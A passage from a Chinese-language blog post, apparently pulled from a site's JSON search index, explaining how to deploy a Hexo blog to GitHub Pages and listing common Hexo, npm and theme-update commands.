https://github.com/Y00z/y00z.github.io.git * branch: master repository中的地址是上面创建的仓库的地址 注意:type: 和repository: 以及branch:冒号后面有一个空格。最后hexo就可以同步到github上了每次同步到github的命令行 hexo clean &amp;&amp; hexo g &amp;&amp; hexo d最后户可以进入your_github_name.github.io 查看效果了。 其他更新 更新hexo： npm update -g hexo 更新主题： cd themes/你的主题 git pull 更新插件： npm update hexo命令 hexo new “postName” #新建文章 hexo new page “pageName” #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口 hexo deploy #将.deploy目录部署到GitHub hexo clean #清除缓存","tags":[{"name":"hexo","slug":"hexo","permalink":"http://y00z.github.io/tags/hexo/"}]}]